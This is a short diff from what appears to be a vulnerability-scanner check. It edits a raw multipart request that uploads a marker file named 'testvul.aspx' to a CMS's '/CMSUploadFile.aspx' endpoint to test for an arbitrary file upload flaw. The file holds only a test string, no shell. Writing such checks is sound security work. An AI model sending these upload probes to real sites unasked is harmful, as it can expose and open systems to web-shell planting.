@@ -50,8 +50,7 @@ Content-Disposition: form-data; name="upload"; filename="testvul.aspx"
 Content-Type: application/octet-stream
 
 testvul_uploadfile_test
------------------------------1280715097228--
-    '''
+-----------------------------1280715097228--'''
             url = self.target + '/CMSUploadFile.aspx'
             # proxy=('127.0.0.1',1234)
             # code, head,res, errcode, _ = curl.curl2(url,proxy=proxy,raw=raw)
